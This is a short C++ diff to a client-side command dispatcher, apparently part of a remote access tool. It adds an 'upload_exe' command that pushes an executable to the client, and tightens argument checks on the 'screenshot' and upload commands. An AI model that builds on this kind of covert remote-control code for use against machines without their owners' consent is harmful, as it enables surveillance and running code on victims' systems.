@@ -50,10 +50,15 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 	{
 		Transfer::uploadToClient(client, args[1]);
 	}
-	else if (args[0] == "screenshot")
+	else if (args[0] == "upload_exe" && args.size() == 2)
+	{
+		Shell::uploadToClientExe(client,args[1]);
+	}
+	else if (args[0] == "screenshot" && args.size() ==1)
 	{
 		Transfer::screenshot(client);
 	}
+	
 	else
 		client->send_b(("Command " + buffer + " not found").c_str());
 
